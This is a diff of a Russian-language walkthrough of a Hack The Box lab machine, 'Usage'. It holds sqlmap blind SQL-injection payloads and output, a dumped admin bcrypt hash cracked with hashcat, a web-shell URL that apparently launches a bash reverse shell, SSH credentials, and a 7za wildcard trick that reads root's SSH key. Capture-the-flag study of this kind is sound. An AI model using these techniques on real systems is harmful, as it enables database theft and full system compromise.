@@ -77,10 +77,15 @@ Content-Length: 77
 Origin: http://usage.htb
 Connection: close
 Referer: http://usage.htb/forget-password
-Cookie: XSRF-TOKEN=eyJpdiI6ImZ3d2lOWVh6MGNNRFBhNDN6WWFuYWc9PSIsInZhbHVlIjoiWThZd3dNeWFzNlhML0s0dGFPOTY4bTdpTjRYL1B4bkdMY283ZVFVeUxIdzZSOHc4WEZUR0hXcXM0NWs3ZFBacTZ1OHo2TGRtWUorbGJlbm5WTGFlRDFpVDhOL1htZStVa0phMTc5WndHODdGbnNwQVF1WHpPSGZZaXlhb3NOWUkiLCJtYWMiOiI3OTc1ODA2MjVlYmFhNjlkYWJmNWE3MDNhMWY2NjJkYWRkYTE3ZmI0NWRmMTJlMTMxNjUyOWRhYjMxNDdiZDkwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlMyNkdXV1E3VjZzTGhYcUIzS2daaFE9PSIsInZhbHVlIjoiaTA5Njd5VVR5ZUxRcHkydEpJNEFsMk0yQXVvNk45bWZuWEJXaXpQNm5BTUhwSzRTdHNFdHhuTURDblFkL0JMSmFaYWZMNi9QMm1pK0g3TVVkZ2VUZmlieXVrSFJEOHA0RFUwSUlJY21HbTFUeHdqNm5vNWFwUWtsS0NCMGFXNnAiLCJtYWMiOiJmNzU5MWFkM2U4ODg3MzNmODgxZTk2YjE1YmRlN2FlZDZjMzc2NDE2Y2MxNjNlMDY2Zjc5MDIyZDlkOTgwYmMyIiwidGFnIjoiIn0%3D
+Cookie: XSRF-TOKEN=eyJpdiI6Ik5jSG5RQ3cxM2NYcUYzZkxWYzhnNWc9PSIsInZhbHVlIjoiQk15TWxRS2h2cmx2bWMrYjQ5TG1rWU03dkZGNzhmN0tEaFowU0lrazhnT0c5QllYZTE0cE05R1RudVpodWE4V0x1VERhQVBYTVNDQ24xQ24zVTV6YmJHMzJPZHNCQ2JHbmczRlZLakhPbXczZG9hc01Wd2J4VWxJc2czSE5HNGgiLCJtYWMiOiIxOTVlOWIwNjBhMzM5ODRhMjk4NjkzNGM3ZWEwZjNiMzNmMGE2ZDNmMDZiNWNkMGI0ZTAwYTc2NTdlOTE5MzI2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InlFbU5KSnA4ZnRMY3AzNnR0YVlpT0E9PSIsInZhbHVlIjoid3loaUVLeVIzSU55dFdkdXFHMUlsSm5JcFVDVEI1c1NKN0svR3VBcjFydW1LbDhLZ3BaK2NlYy84amQ0c3VkQkJFTjU0K2t0RXVsdEk3eDlqTmdCdFl3WWt5MVovL0VydDNxa1MyL2FYU2d6dTF5V2pyUG84TFNZbXRwajFSSEMiLCJtYWMiOiJjZmFmNDA0YmJhZDJkYjIzNTU3ZGEwYmI4YjMwNzBjOGJhNTQ4YmIzYzk3ODFmMmJlMGUwYTdlM2I3ZWJjMzlkIiwidGFnIjoiIn0%3D
 Upgrade-Insecure-Requests: 1
 
-_token=Ox7rfQ8dOHPEVq3G5LBxR6uaovro8mqppbtdnVH4&email=maxhacker%40thebest.htb
+_token=np1PHzekysIDMjaeWXnAg0ZnUj5YOvNpu8fmU64B&email=maxhacker%40thebest.htb*
+
+
+
+
+Не забываем поставить маркер * в конце запроса. Так sqlmap понимает в какой параметр бить, если явно не указывать ему через -r.
 
 
 
@@ -99,14 +104,99 @@ sqlmap -r maxhacker.req --level 5 --risk 3 --threads 10 --batch
 Ещё лучше!
 [INFO] target URL appears to have 8 columns in query
 Вообще блеск!
+[INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
+(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 738 HTTP(s) requests:
+---
+Parameter: #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: _token=Ox7rfQ8dOHPEVq3G5LBxR6uaovro8mqppbtdnVH4&email=maxhacker@thebest.htb' AND 3925=(SELECT (CASE WHEN (3925=3925) THEN 3925 ELSE (SELECT 9887 UNION SELECT 9767) END))-- qToe
+
+    Type: time-based blind
+    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
+    Payload: _token=Ox7rfQ8dOHPEVq3G5LBxR6uaovro8mqppbtdnVH4&email=maxhacker@thebest.htb' AND 8067=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- RIjc
+---
+[10:52:17] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL > 5.0.12
+Ляпота...
+
+ 
+А теперь, зная, что мы нашли blind инъекцию в MySQL, добавим необходимые параметры, чтобы сделать дамп базы и отобразить таблицы
+
+sqlmap -r maxhacker.req --level 5 --risk 3 --threads 10 --batch --tables --dump --exclude-sysdb --dbms=mysql
+
+[INFO] retrieved: aAAQA A?co?_? hema             
+[11:14:16] [INFO] retrieving the length of query output
+[11:14:16] [INFO] retrieved: 18
+[11:14:39] [INFO] retrieved: performance_schema             
+[11:14:39] [INFO] retrieving the length of query output
+[11:14:39] [INFO] retrieved: 10
+[11:14:52] [INFO] retrieved: usage_blog             
+[11:14:52] [INFO] fetching tables for databases: 'aAAQA\nA?co?_?\x05hema, performance_schema, usage_blog'
+[11:14:52] [INFO] skipping system database 'performance_schema'
+[11:14:52] [INFO] fetching number of tables for database 'usage_blog'
+[11:14:52] [INFO] retrieved: 15
+[11:14:57] [INFO] retrieving the length of query output
+[11:14:57] [INFO] retrieved: 10
+[11:15:10] [INFO] retrieved: admin_menu             
+[11:15:10] [INFO] retrieving the length of query output
+[11:15:10] [INFO] retrieved: 19
+[11:15:33] [INFO] retrieved: admin_operation_log             
+[11:15:33] [INFO] retrieving the length of query output
 
 
-А теперь, зная, что мы нашли boolean-based blind инъекцию в MySQL, добавим необходимые параметры, чтобы сделать дамп базы и отобразить таблицы
+Database: usage_blog
+[15 tables]
++------------------------+
+| admin_menu             |
+| admin_operation_log    |
+| admin_permissions      |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_role_users       |
+| admin_roles            |
+| admin_user_permissions |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| personal_access_tokens |
+| users                  |
++------------------------+
 
-sqlmap --level 5 --risk 3 --threads 2 --batch -r reset-password.req --tables --dump --exclude-sysdb --dbms=mysql
 
 
-подбор пароля админа через hashcat даёт нам пароль администратора сайта.
+
+Достали имена всех таблиц из базы usage_blog!
+
+Добавляем параметр -D с именем базы и -T с именем таблицы.
+
+sqlmap -r maxhacker.req --level 5 --risk 3 --threads 10 --batch --tables --dump --exclude-sysdb --dbms=mysql -D usage_blog -T admin_users
+
+Database: usage_blog
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username 
+| created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    
+| 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+
+Хеш пароля администартора сайта admin - kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT
+
+hashcat hash /home/kali/Desktop/rockyou.txt -m 3200
+
+$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
+
+Подбор пароля админа через hashcat даёт нам пароль администратора сайта - whatever1
+
+Логинимся на сайт admin.usage.htb и изучаем.
 
 
 
@@ -182,8 +272,11 @@ http://admin.usage.htb/uploads/images/maxhacker.php?cmd=bash%20-c%20%27bash%20-i
 Подключаемся по ssh под кредами xander:3nc0d3d_pa$$w0rd
 
 
-Оставленный на машине исполняемый ELF файл с своеобразным функционалом;
 
+Оставленный на машине исполняемый ELF файл с своеобразным функционалом;
+          Эксплоит "7za wildcard" и добыча файла id_rsa рута через костыли.
+
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- @whatever whatever
 
 xander@usage:/var/www/html$ touch @maxhacker; ln -fs /root/.ssh/id_rsa maxhacker
 xander@usage:/var/www/html$ sudo usage_management
@@ -254,11 +347,7 @@ H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
 Scan WARNINGS: 7
 
 
-Эксплоит "7za wildcard" и добыча файла id_rsa рута через костыли;
 
-
-
-/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- @whatever whatever
 
 
 
